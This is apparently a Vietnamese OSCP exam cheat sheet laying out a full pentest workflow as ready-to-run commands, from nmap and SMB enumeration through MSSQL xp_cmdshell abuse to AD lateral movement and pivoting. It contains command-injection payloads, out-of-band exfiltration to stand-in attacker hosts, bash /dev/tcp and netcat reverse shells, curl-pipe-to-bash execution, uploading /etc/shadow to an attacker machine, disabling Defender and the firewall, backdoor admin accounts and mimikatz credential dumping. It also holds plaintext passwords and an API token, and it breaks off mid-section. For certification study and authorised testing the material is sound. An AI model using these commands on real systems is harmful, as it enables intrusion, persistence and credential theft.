# Flow 2026 OSCP

---

## Recon / Network Enumeration

### Port Scanning with nmap

#### Nmap với các cổng common
```bash
nmap --top-port=1000 --min-rate=1000 -Pn -n -oN top-port.txt <IP>
```

#### Nmap với full cổng TCP
```bash
nmap -p- --min-rate=1000 -Pn -n -oN all-port.txt <IP>
```

#### Nmap detect version và script với cổng đang mở
```bash
nmap -sC -sV -p<ports_open> -oN detailed.txt <IP>
```

#### Nmap với cổng UDP
```bash
nmap -sU --top-ports 100 <IP>
```

#### Nmap với các Service cụ thể
```bash
nmap --script=smb-vuln* -p445 <IP>
nmap --script=ftp-anon -p21 <IP>
nmap --script=http-enum -p80,443 <IP>
```

---

### SMB Enum

#### SMB enum

**Sử dụng netexec**
```bash
nxc smb 192.168.56.11
```

**Sử dụng smbmap**
```bash
smbmap -H 192.168.56.11
smbmap -H 192.168.56.11 -r ITDEPT
```

**Sử dụng Enum4Linux-ng**
```bash
enum4linux 192.168.64.151 -A -C
# -A: enum all (sharelist, user ..)
# -C: đi sâu vào các mục share
```

**Thu thập thông tin về username để bruteforce**
```bash
rpcclient -U'%' 192.168.56.11
enumdomusers
```

**Kết nối**
```bash
smbclient -N -L //$IP
smbclient //[ip]/[share] -N
impacket-smbclient user:password@192.168.56.11
```

**Write file**
```bash
put localfile.txt remotename.txt
smbclient //192.168.56.11/share -U "user%pass" -c "put shell.php"
```

**Download file**
```bash
get "Example File.txt"
```

**Download Folder**
```
smb> mask ""      # match all file
smb> recurse ON
smb> prompt OFF
smb> mget *
```

**Download big file**
```bash
smbget smb://<target-ip>/somedir/example.txt -U username
smbget -R smb://<target-ip>/somedir -U username
```

#### Liệt kê Shares folder

**Không tài khoản**
```bash
smbclient -N -L //$IP
smbclient -L //$IP -U anonymous
smbclient -L //$IP

netexec smb $IP -u '' -p '' --shares
netexec smb $IP -u guest -p '' --shares
```

**Có tài khoản**
```bash
# sử dụng nxc
netexec smb [host/ip] -u [user] -p [pass] --shares
nxc smb <target> -u <username> -H <NTLM_hash> --shares

# sử dụng smbclient
smbclient -L //192.168.1.100 -U user
impacket-smbclient user:password@192.168.56.11
smbclient.py -hashes <NTHASH> <domain>/<username>@<target>

# Download tất cả
smbclient //10.10.193.140/SYSVOL -U 'oscp.exam\celia.almeda%7k8XHk3dMtmpnC7' -c "recurse ON; prompt OFF; mget *"
```

#### Truy cập Shares folder

**Không tài khoản**
```bash
smbclient //[ip]/[share] -N
```

**Có tài khoản**
```bash
smbclient //[ip]/[share] -U [username] [password]
netexec smb -u [user] -p [pass] -M spider_plus $IP
```

#### Thu thập Username để bruteforce

**Không tài khoản**
```bash
lookupsid.py guest@[ip] -no-pass
netexec smb [ip] -u guest -p '' --rid-brute
rpcclient -U "" -N 10.10.10.161   # rồi gõ: enumdomusers
```

**Có tài khoản**
```bash
netexec smb [host/ip] -u [user] -p [pass] --rid-brute
netexec smb <target-ip> -u John -p Password123 --users
samrdump.py [domain]/[user]:[pass]@[ip]
impacket-lookupsid svc_apache:'S@Ss!K@*t13'@'flight.htb'
```

---

### SNMP Enum

**Bruteforce common string**
```bash
onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp-onesixtyone.txt 192.168.68.151
```

**SNMP enum**
```bash
snmpwalk -c public -v1 192.168.68.151
snmpwalk -c public -v2c 192.168.68.151
```

**snmp-mibs Plugin**
```bash
sudo apt update
# step 1:
sudo apt install snmp-mibs-downloader
# step 2:
sudo download-mibs
# step 3:
sudo nano /etc/snmp/snmp.conf
# step 4: find "mibs :" and comment it → "#mibs :"
# step 5: run snmpwalk again
```

---

### FTP Enum

**Lệnh truy cập ftp**
```bash
ftp 192.168.1.1 21
```

**Default creds**
```
anonymous : anonymous
anonymous :
ftp : ftp
```

**FTP command**
```bash
# Chuyển active mode sang passive mode
passive
passv

# Chuyển từ bin sang ascii
binary
ascii

# Lệnh download file
get file.txt

# Lệnh download tất cả các file
wget -r --user='username' --password='password' ftp://<target-ip>/sample
wget -m ftp://anonymous:anonymous@X.X.X.X
wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98
# -r: đệ quy
# -m: mirror: gồm đệ quy và nhiều option khác
```

**Lỗi cấu hình**
```
chroot_local_user=NO
# không giam user trong folder home
# có thể thực hiện path traversal để lấy các thông tin từ folder khác như /etc/passwd
```

---

### Web Enum

#### VHOST Subdomain

- Truy cập vào web trên cổng có dịch vụ http
- Nếu nội dung web có xuất hiện domain → thực hiện add host và Fuzzing vhost

**Sử dụng ffuf**
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u https://192.168.1.10 -H "Host: FUZZ.example.com" -ac
```

**Sử dụng gobuster**
```bash
gobuster vhost -u https://<target> -w /path/to/wordlist.txt --append-domain
```

#### Server Application

**Header Response**
```bash
curl -I http://example.com
nmap -p 80,443 --script http-server-header example.com
nmap -p 80,443 -sCV example.com
whatweb example.com
```

- FORCING ERROR PAGE (404): `http://example.com/donotexist`
- FORCING ERROR PAGE (500): Thêm ký tự đặc biệt vào Header Host trong request

**Language - Kiểm tra extends file**
```
PHP:        index.php, login.php
ASP.NET:    default.aspx, login.asmx
JSP (Java): index.jsp, home.jsp
Python:     .py hiếm khi thấy nhưng có thể có /admin/ (Django)
Ruby on Rails: .rb, /users/sign_in (mặc định Rails)
Perl:       .pl, .cgi
```

```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t 40 -x txt,py,html,js -o gobuster.root-directory -u http://10.10.11.38:50
```

#### Scan directory and file (đệ quy) + theo công nghệ sử dụng

**Sử dụng Wordlist có sẵn**
```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t 10 -x txt,py,html,js -o gobuster.root-directory -u http://10.10.11.38:50

ffuf -u http://example.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -ac

# Các wordlist sử dụng:
# common.txt
# raft-medium-directories.txt
```

**Scan file**
```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt -t 10 -u http://10.10.11.38:5000
```

**Thu thập thông tin nhạy cảm (User, pass, key …)**
```bash
# Sử dụng Search Engine
site:example.com filetype:pdf | filetype:txt | filetype:log
filetype:env
filetype:sql
filetype:log
filetype:json
filetype:xml
filetype:bak
filetype:zip
```

- File: pdf, docx, xlxs, log, env, sql, log, json, xml, bak, zip, rar
- keyword: pass, user, password, secret, encrypt

**Lệnh wpscan nếu xác định sử dụng wordpress**
```bash
wpscan --url http://192.168.219.1:8181 --enumerate vp --plugins-detection mixed --api-token BVSRLNso8Esjzv1Xa7hjifkawspZKyWPZbPptw8Y2J8
```

---

### MSSQL

#### Enumeration Không tài khoản
```bash
nmap --script ms-sql-info -p 1433 <target-ip>
nmap --script ms-sql-config -p 1433 <target-ip>
nmap --script ms-sql-empty-password,ms-sql-xp-cmdshell -p 1433 <target-ip>
nmap --script ms-sql-* -p 1433 <target-ip>

# Tài khoản cần thử:
# sa / (blank)
# sa / sa
# sa / password
# sa / P@ssw0rd
# MSSQL / MSSQL
```

#### Enumeration Có tài khoản hoặc có phiên
```sql
-- Phiên bản & thông tin server
SELECT @@VERSION;
SELECT SERVERPROPERTY('ProductVersion')

-- User hiện tại
SELECT SYSTEM_USER, USER_NAME(), ORIGINAL_LOGIN();

-- Database có thể truy cập
SELECT name FROM sys.databases
WHERE HAS_DBACCESS(name) = 1;

-- Switch to the database
USE <database>

-- Liệt kê tables trong DB hiện tại
SELECT TABLE_SCHEMA, TABLE_NAME
FROM INFORMATION_SCHEMA.TABLES
WHERE TABLE_TYPE = 'BASE TABLE';

-- Quyền của user hiện tại
SELECT * FROM fn_my_permissions(NULL, 'SERVER');

-- Liệt kê linked servers
SELECT name, data_source, provider, is_remote_login_enabled, is_rpc_out_enabled FROM sys.servers WHERE is_linked = 1;

-- Kiểm tra RPC Out có bật không (bắt buộc để dùng EXEC AT)
EXEC sp_helpserver;

-- Thông tin chi tiết linked
EXEC sp_linkedservers;
EXEC sp_helplinkedsrvlogin;

-- Test kết nối đến linked server
EXEC ('SELECT @@VERSION') AT [LINKEDSRV];

-- Kiểm tra quyền trên linked server
EXEC ('SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT [LINKEDSRV];
```

#### Command connect
```bash
# sử dụng impacket
impacket-mssqlclient -port 1433 DOMAIN/username:password@<target-ip>
impacket-mssqlclient -port 1433 DOMAIN/username:password@<target-ip> -windows-auth
impacket-mssqlclient -port 1433 username@hostname -windows-auth

# sử dụng sqlcmd
# Windows Authentication
sqlcmd -S SQLSERVER01 -E

# Chỉ định port khác (không phải 1433)
sqlcmd -S 192.168.1.100,1434 -U sa -P "P@ssw0rd"

# Chạy query thẳng không vào interactive
sqlcmd -S 192.168.1.100 -U sa -P "P@ssw0rd" -Q "SELECT @@version"

sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select table_name from streamio_backup.information_schema.tables";
```

#### Command sử dụng
```sql
-- Get the version of MSSQL
SELECT @@version

-- Get current username
SELECT user_name()

-- Get all users
SELECT * FROM sys.database_principals

-- Get databases
SELECT * FROM master.dbo.sysdatabases

-- Switch to the database
USE <database>

-- List tables
SELECT * FROM information_schema.tables

-- Get table content
SELECT * FROM <database_name>.dbo.<table_name>
```

---

### MYSQL

> *(Mục này chưa có nội dung chi tiết trong note)*

---

## Initial Access / Exploitation

### Kiểm tra CVE
- CVE Service
- Web Exploit

### SQL injection

#### MSSQL

**Về phiên bản**
- `xp_cmdshell` - Có từ SQL 2000, bị disable mặc định từ SQL 2005+

**Về cấu hình**
- MSSQL có thể được cấu hình chạy Public hoặc local

**Về Xác thực**
MSSQL có 2 chế độ xác thực:
- **Windows Authentication Mode**: Chỉ chấp nhận Windows/AD accounts. Xác thực bằng Client → Windows/Kerberos/NTLM → SQL Server. Sử dụng token base, không truyền password. SA account bị disable mặc định. Không thể bị bruteforce.
- **Mixed Mode Authentication (SQL Server + Windows)**: Cho phép sử dụng tài khoản Windows và tài khoản SQL riêng. Tài khoản SQL sử dụng username/password để xác thực. Password hash lưu trong `sys.sql_logins`. SA account có thể enable. Brute force được qua port 1433.

**Cách đăng nhập trong local - Sử dụng sqlcmd**
```bash
# folder C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\ToolsBinn\sqlcmd.exe

# Kết nối Windows Auth
sqlcmd -S localhost
sqlcmd -S localhost -No

# Kết nối SQL Auth
sqlcmd -S localhost -U sa -P password

# Kết nối port cụ thể
sqlcmd -S localhost,1433 -U sa -P password

# Chạy query thẳng
sqlcmd -S localhost -U sa -P password -Q "SELECT @@VERSION"

# Không cần trusted cert (SQL 2022+ hay gặp lỗi cert)
sqlcmd -S localhost -U sa -P password -No
```

**Cách đăng nhập từ public**
```bash
# Sử dụng sqlcmd với SQL account
sqlcmd -S localhost -U sa -P password -No

# Sử dụng impacket
# với tài khoản windows auth
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth

# với tài khoản SQL
impacket-mssqlclient Administrator:Lab123@192.168.50.18
```

#### MSSQL Server trong Pentest

**Thu thập thông tin unauth**
```bash
# Sử dụng nmap
nmap -p 1433 --script ms-sql-* 192.168.1.100

# Đăng nhập không cần pass - chỉ đổi với trên localhost
sqlcmd -S localhost -No

# Đăng nhập không pass từ xa
impacket-mssqlclient sa@192.168.1.100
impacket-mssqlclient sa:@192.168.1.100
impacket-mssqlclient guest:@192.168.1.100

# Bruteforce
hydra -L users.txt -P passwords.txt mssql://192.168.1.100
```

**Thu thập thông tin đã auth**
```sql
-- Role hiện tại
SELECT IS_SRVROLEMEMBER('sysadmin')        -- 1 = có
SELECT IS_SRVROLEMBER('securityadmin')
SELECT IS_SRVROLEMBER('serveradmin')
SELECT IS_SRVROLEMEMBER('db_owner')

-- Kiểm có thể xp_cmdshell không
SELECT name, value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell'
-- value_in_use = 1 → đang enable

-- Bật xp_cmdshell
-- Bước 1: Enable advanced options
EXEC sp_configure 'show advanced options', 1
RECONFIGURE

-- Bước 2: Enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE
```

**Thu thập dữ liệu CSDL**
```sql
EXEC sp_databases;
SELECT name FROM master..sysdatabases;

USE ten_database

-- Thu thập bảng trong CSDL
SELECT name FROM sys.tables;

-- Thu thập dữ liệu trong bảng
SELECT * FROM dbname.db_table;
```

### MYSQL Upload File RCE

### Creds

### File Upload
- Bypass extension
- Bypass MIME
- Bypass Content-Type

### LFI/RFI

### Command Injection

**Detect command injection**
```bash
# inband
; id
| id
|| id
& id
&& id
` id `
$(id)
%0a id
%0d%0a id
; whoami
| whoami
& ping -n 1 127.0.0.1
; cat /etc/passwd
| type C:\Windows\win.ini

# Payload blind / time-based
; sleep 10
| sleep 10
&& sleep 10
`sleep 10`
$(sleep 10)
; ping -c 10 127.0.0.1

# Out-of-Band
; nslookup attacker.oob.example.com
| curl http://attacker.oob.example.com
& wget http://attacker.oob.example.com
```

### Vulnerabilities, CVE trên các CMS, Plugin, Framework, Library
```bash
# wordpress plugin
wpscan
```

### Credentials
- Lấy từ việc enum các Service
- Crack password từ các file mã hoá
- Spray các Username và password tìm được

### MSSQL Service

**Sử dụng xp_cmdshell**
```sql
-- Kiểm tra xp_cmdshell có được bật không
SELECT value_in_use
FROM sys.configurations
WHERE name = 'xp_cmdshell';

-- Bật qua sp_configure (yêu cầu quyền sysadmin)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

-- Bật xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Thực thi lệnh đơn giản
EXEC xp_cmdshell 'whoami';

-- download nc traditional về Windows
EXEC xp_cmdshell 'curl -o C:\Users\Public\nc.exe http://kali/nc.exe';

-- Xác nhận đã có
EXEC xp_cmdshell 'dir C:\Users\Public\nc.exe';

-- run nc (rlwrap nc -lvnp 4444)
EXEC xp_cmdshell 'C:\Users\Public\nc.exe -e cmd.exe Kali 4444';
```

**Sử dụng xp_cmdshell với linked server**
```sql
-- Bật show advanced options
EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [SQL03.TECH.DEHOSPITAL.COM];

-- Bật xp_cmdshell
EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [SQL03.TECH.DEHOSPITAL.COM];

-- Xác nhận
EXEC ('SELECT name, value_in_use FROM sys.configurations WHERE name = ''xp_cmdshell''') AT [SQL03.TECH.DEHOSPITAL.COM];

-- Cú pháp cơ bản với EXEC ... AT
EXEC ('xp_cmdshell ''whoami''') AT [SQL03.TECH.DEHOSPITAL.COM];

-- download shell
EXEC('xp_cmdshell ''curl http://kali/shell.exe -o C:\Users\Public\shell.exe'';') AT [SQL03.TECH.DEHOSPITAL.COM]

-- run shell
EXEC('xp_cmdshell ''C:\Users\Public\shell.exe 192.168.49.68 443 powershell'';') AT [SQL03.TECH.DEHOSPITAL.COM]
```

---

## Linux

### Shell stabilization
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
reset
```

### Enumeration

**Automatic Enum**
```bash
linpeas.sh
```

**Biết vị trí hiện tại mình là ai, có quyền gì**
```bash
# là ai, thuộc nhóm nào, nhóm có đặc quyền không
id; whoami; groups

# mình có được chạy app nào với quyền sudo không
sudo -l

# mình có thể chạy app nào có thể đổi thành quyền sudo không
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# mình có thể chạy app nào với quyền đặc biệt không
getcap -r
```

**Biết đích đến của mình là gì**
```bash
# Mục tiêu là lên root
# Trên máy có mục tiêu khác không (User, group)
cat /etc/passwd
```

**Biết trên máy có những gì**
```bash
# Trên máy các tác vụ cron nào không
./pspy.py

# Trên máy có nfs không
cat /etc/exports

# Trên máy có dịch vụ nào đang mở local không
ss -tulnp

# Trên máy có process nào khả nghi không
ps aux

# Trên máy có lưu trữ thông tin nhạy cảm nào không
grep -rEi "(password|passwd|pwd|secret|token|api[_-]?key)\s*[:=]" / --include="*.{conf,config,env,php,py,yml,yaml,json,xml,ini,txt,sh}" 2>/dev/null

# Trên máy có mạng thứ 2 không
ip a

# Trên máy đã cài những ứng dụng nào
dpkg -l

# Có thể write vào các thư mục nào
find / -writable -type d 2>/dev/null

# Máy tính có những ổ cứng nào
cat /etc/fstab
lsblk

# Xác định systeminfo
systeminfo
```

### Privilege Escalation

- **Sử dụng Creds**: spray password, username
- **Sử dụng nhóm có quyền đặc quyền**: docker, sudo, ...
- **Sử dụng lạm dụng sudo**
- **Sử dụng quyền ghi vào các file đặc biệt**
- **Sử dụng Cronjob**
- **Sử dụng SUID**
- **Sử dụng Capabilities**
- **Sử dụng nfs**
- **Sử dụng Kernel Exploit**

### Looting, Persistence

**Persistence**
```bash
# Tạo SSH key để connect lại trong trường hợp bị sai proof
ssh-keygen -t rsa -b 4096 -f ./id_rsa_root -N ""
cat id_rsa_root.pub

mkdir -p /root/.ssh
echo "ssh-rsa AAAA...<public key>" >> /root/.ssh/authorized_keys

chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
```

**Looting**
- Chụp PoC local.txt, proof.txt và ip
- Chạy lại linpeas

---

## Windows

### Enumeration

**Biết trên máy có AV, firewall hay không**
```powershell
# Trạng thái Windows Defender
Get-MpComputerStatus

# Danh sách AV đăng ký với Windows Security Center
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct

# Danh sách sản phẩm chống mã độc/firewall đăng ký
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiSpywareProduct
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName FirewallProduct

# Kiểm tra tiến trình đang chạy
Get-Process | Sort-Object CPU -Descending

# Kiểm tra dịch vụ (service) đang chạy
Get-Service | Where-Object {$_.Status -eq 'Running'}

# Kiểm tra trạng thái tất cả profiles firewall
netsh advfirewall show allprofiles state
Get-NetFirewallProfile | Select-Object Name, Enabled
```

**Automatic Enum**
```bash
winpeas.exe
```

**Biết vị trí hiện tại mình là ai, có đặc quyền gì**
```cmd
whoami /all
```

**Biết đích đến của mình là gì**
```cmd
# Mục tiêu là lên admin
# Trên máy có tài khoản nào có quyền Admin
net user

# Trên máy có nhóm nào có quyền đặc biệt
net localgroup

# Trên máy có tài khoản nào có quyền đặc biệt
net user <taikhoan>
```

**Biết trên máy có những gì**
```cmd
# Trên máy có folder lạ nào không (Script, Task, Xampp, inetpub)

# Thư mục User có file nào lạ không
tree /f C:\Users\

# Trên máy có các service nào đặc biệt
# Service Binary Hijacking, DLL hijacking, Unquote Service Path

# Trên máy có các port local nào mở
netstat -ano

# Trên máy có các drive nào
fsutil fsinfo drives

# Trên máy các dải mạng khác không
ipconfig /all

# Trên máy các process nào lạ
Get-Process
tasklist /v

# Trên máy cài các ứng dụng nào
dir "C:\Program Files\"
dir "C:\Program Files (x86)\"
```

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

**Password trong các file nhạy cảm**
- file config, env, txt, bak, zip, powershell history, log, script vbs, ps1
- CSDL
- File .ssh/id_rsa
- file mã hoá Keepass
- file git, docker
- kết quả winpeas

### Privilege Escalation

- **Sử dụng Creds**: spray password, username
- **Sử dụng Privilege**: Impersonate, SeAssignPrimaryTokenPrivilege, SeBackup, SeRestore, SeDebug
- **Sử dụng Service Binary Hijacking**
- **Sử dụng DLL hijacking**
- **Sử dụng Unquote Service Path**
- **Sử dụng Scheduled Task**
- **Sử dụng CVE application**
- **Sử dụng Kernel Exploit**

### Looting, Persistence

**Với standalone**
```powershell
# Tắt AV nếu có
Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIntrusionPreventionSystem $true; Set-MpPreference -DisableIOAVProtection $true

# Tắt FW nếu có
# cmd
netsh advfirewall set allprofiles state off

# powershell
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

```cmd
# Tạo tài khoản Admin để dễ remote
net user hacker Password123! /add
net localgroup administrators hacker /add
```

**Với AD**
```powershell
# chạy lại winpeas
winpeas.exe

# Dùng mimikatz dump nếu có session của user khác trên máy
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::tickets
impacket-secretsdump -k -no-pass corp.com/alice@Web01
```

```cmd
# Tạo tài khoản Admin để dễ remote
net user hacker Password123! /add
net localgroup administrators hacker /add
```

---

## Active Directory

### Local Windows Enumeration

### Pivoting
- Sử dụng chisel
- Sử dụng ligolo

### Active Directory Enumeration

**Sử dụng sharphound**
- User Domain hiện tại có quyền gì (Outbound, isAdmin …)
- Máy hiện tại có những gì (Ai là admin local, Có dịch vụ nào chạy, …)
- Admin Domain là Tài khoản nào
- Tài khoản Admin Domain chịu ảnh hưởng từ cài gì (Inbound)
- Có Tài khoản Dont-Preauth-require không
- Có Tài khoản Service
- Có DCsync không
- Có Groups domain nào đặc biệt không
- Có lạm quyền GPOs được không
- Có session (User - Computer)
- Tài khoản nào là tài khoản Admin local và trên máy nào
- Các ACLs trên domain
- Có AD CS không
- Các Deleted Objects

### Privilege Escalation

**AD attack**
- AS-REP roasting
- Kerberoasting
- Silver tickets
- Bruteforce

### Looting, Persistence

**Mở dịch vụ RDP**
```powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

netstat -an | findstr 3389
```

### Lateral Movement

**Spray**

**Password + spray**
```bash
# Spray với list user
nxc smb 192.168.1.1 -u users.txt -p 'Password123!' --continue-on-success

# Spray với host
nxc smb 192.168.1.0/24 -u alice -p 'Password123!' --continue-on-success
```

**Pass the ticket + spray (Linux)**
```bash
# Chuyển ticket windows sang ticket linux
impacket-ticketConverter ticket.kirbi ticket.ccache

# Import vào kali
export KRB5CCNAME=/path/to/ticket.ccache
sudo apt install krb5-user -y
klist

# Thu thập hostname -> ghi vào hosts file
nxc smb 192.168.1.0/24 -k --use-kcache --generate-hosts-file hosts.txt
nxc smb 192.168.1.0/24 -u jeff -p HenchmanPutridBonbon11 --generate-hosts-file hosts.txt

# Đồng bộ thời gian với dc
sudo ntpdate DC-ip
```

**Cấu hình /etc/krb5.conf**
```ini
[libdefaults]
    default_realm = CORP.COM
    dns_lookup_realm = false
    dns_lookup_kdc = false
    forwardable = true

[realms]
    CORP.COM = {
        kdc = dc1.corp.com
        admin_server = dc1.corp.com
    }

[domain_realm]
    .corp.com = CORP.COM
    corp.com = CORP.COM
```

**Spray với host (ticket)**
```bash
nxc smb 192.168.1.0/24 -k --use-kcache --continue-on-success
nxc winrm 192.168.1.0/24 -k --use-kcache --continue-on-success
nxc mssql 192.168.1.0/24 -k --use-kcache --continue-on-success
```

**Lateral Movement (Windows)**

```bash
# Sử dụng Impacket + password
# Với smb
psexec.py domain.local/user:'password'@target_ip
smbexec.py domain.local/user:'password'@target_ip
atexec.py domain.local/user:'password'@target_ip "whoami"

# Với wmi
wmiexec.py domain.local/user@target_ip

# Với dcom
dcomexec.py domain.local/user:'password'@target_ip
```

```bash
# Sử dụng Impacket + Hash
psexec.py domain.local/user@target_ip -hashes :NTLM_HASH
wmiexec.py domain.local/user@target_ip -hashes :NTLM_HASH
smbexec.py domain.local/user@target_ip -hashes :NTLM_HASH
atexec.py domain.local/user@target_ip -hashes :NTLM_HASH "whoami"
wmiexec.py user@target_ip -hashes :NTLM_HASH -local-auth
```

```bash
# Sử dụng Impacket với ticket
wmiexec.py -k -no-pass domain.local/user@target.domain.local
psexec.py -k -no-pass domain.local/user@target.domain.local
smbexec.py -k -no-pass domain.local/user@target.domain.local
atexec.py -k -no-pass domain.local/user@target.domain.local "whoami"
```

---

## ToolBox

### Pivot

#### Sử dụng ligolo

**Setup cơ bản**
```bash
# Tạo 1 card mạng TUN ảo với tên là ligolo trên Kali
sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up

# Xoá 1 card mạng ligolo
ip link set ligolo down
ip tuntap del mode tun ligolo

# Trên Kali tạo proxy listen lắng nghe các kết nối đến
sudo ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# Trên Pivot1 chạy agent để kết nối về proxy Kali
ligolo-agent -connect 192.168.45.161:11601 -ignore-cert

# Trên Kali xem danh sách agent đã kết nối và chọn pivot1
» session          # chọn pivot1
» start

# Xoá 1 session
session -> stop

# Tạo route đến dải mạng thứ 2 của máy pivot1
ip route add 10.10.2.0/24 dev ligolo

# Xoá 1 route
ip route del 240.0.0.1/32 dev ligolo

# Xem 1 route
ip route show | grep ligolo

# Tạo route đến localhost của pivot1
ip route add 240.0.0.1/32 dev ligolo

# Xoá 1 listener
listener_stop
```

**Ligolo Reverse shell**
```bash
# Set up ligolo như ban đầu
# Tạo route ngược từ pivot1 về Kali
listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:4444 --tcp
listener_list
# Dữ liệu TCP đi vào cổng 8000 trên mọi interface của agent1(Pivot1) sẽ được chuyển đến 127.0.0.1:4444 trên kali
```

**Ligolo Double Pivot**
```bash
# Trên KALI tạo một kết nối từ pivot1 về kali
listener_add --addr 0.0.0.0:8001 --to 127.0.0.1:11601 --tcp

# Trên Pivot2 chạy agent để kết nối ngược về pivot1
ligolo-agent -connect 10.10.2.20:8001 -ignore-cert

# Thiết lập card tun mới
ip tuntap add user root mode tun ligolo2
ip link set ligolo2 up

# Tạo route mới
ip route add 10.10.3.0/24 dev ligolo2
```

#### Sử dụng SSH
```bash
# SSH local port
# SSH remote port
# SSH dynamic local
# SSH dynamic remote
```

---

### File Transfer

#### Download

**Sử dụng Base64**
```bash
# Trên kali base64 file cần đưa lên server
cat id_rsa | base64 -w 0; echo

# Trên máy Server linux decode
echo -n 'LS0t...' | base64 -d > id_rsa
```

**Sử dụng http curl + wget**
```bash
# Trên máy kali host http server
python -m http.server 80

# Trên máy linux Server download file từ Kali
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

# Tải về và thực thi luôn
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

**Sử dụng http với bash (Bash version ≥ 2.04)**
```bash
# Trên kali host python webserver
python -m http.server 80

# Trên máy Target chạy bash connect đến Server và lấy file
exec 3<>/dev/tcp/kali_ip/80
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
cat <&3
```

**Sử dụng SSH (SCP Download)**
```bash
# Trên kali bật dịch vụ ssh
sudo systemctl enable ssh
sudo systemctl start ssh

# Trên Target sử dụng scp để download
scp kali@192.168.49.128:/root/myroot.txt
```

#### Upload

**Sử dụng http upload server**
```bash
# Cài đặt upload server trên kali
sudo python3 -m pip install --user uploadserver

# Tạo chứng chỉ ssl
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
mkdir https && cd https

# Bật Web server upload với Cert
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

# Trên máy Target upload file về kali
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

**Sử dụng SCP Upload**
```bash
# Từ Target upload file về Kali
scp /etc/passwd kali@10.129.86.90:/home/kali/
```

---

### Faketime
```bash
faketime "$(ntpdate -q 10.10.193.140 | cut -d ' ' -f 1,2)" \
impacket-GetUserSPNs oscp.exam/Eric.Wallows:EricLikesRunning800 -dc-ip 10.10.193.140 -request -outputfile kerberos1.hash
```

---

### Shell and Reverse shell

#### Xác định Môi trường Shell

**Phân biệt Unix hay Windows**
```bash
# inband
id
ifconfig
ipconfig
ip a

# qua OOB
wget http://your.burpcollaborator.net/$(id | base64)

# qua timebase
sleep 5
ping -c 5 127.0.0.1 > nul
```

**Xác định loại shell trên Linux**
```bash
echo $0
echo $SHELL
ps -p $$
cat /proc/$$/comm

# Sử dụng Blind
[ -n "$ZSH_VERSION" ] && sleep 5    # zsh delay
[ -n "$BASH_VERSION" ] && sleep 5   # Bash, sh delay

# Dùng OOB
curl http://your.collaborator.net/shell?v=$(echo $0|base64)
```

**Xác định shell trên Windows**
```powershell
# Sử dụng trực tiếp
ls  # -> Powershell

# Dùng time base
sleep 5; # -> powershell
Start-Sleep -Seconds 5

# OOB
iwr http://your.collaborator.net/?v=$PSVersionTable.PSVersion
```

#### Linux

**Shell stabilization**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
reset
```

**Shell for /bin/bash**
```bash
# Recommend
bash -c "bash -i >& /dev/tcp/IP_KALI/443 0>&1"
/bin/bash -c "/bin/bash -i >& /dev/tcp/IP_KALI/443 0>&1"

# Shell nc none e
;rm /tmp/z;mkfifo /tmp/z;cat /tmp/z|/bin/bash -i 2>&1 | nc 192.168.1.2 443 >/tmp/z;
```

**Shell for /bin/sh**
```bash
# recommend - nếu Máy chủ có hỗ trợ bash và sh
bash -c "bash -i >& /dev/tcp/IP_KALI/443 0>&1"

# Sử dụng sh nếu máy chủ chỉ hỗ trợ sh
sh -i >& /dev/tcp/192.168.45.205/4444 0>&1
/bin/sh -i >& /dev/tcp/192.168.45.205/4444 0>&1
```

**Shell for python**
```bash
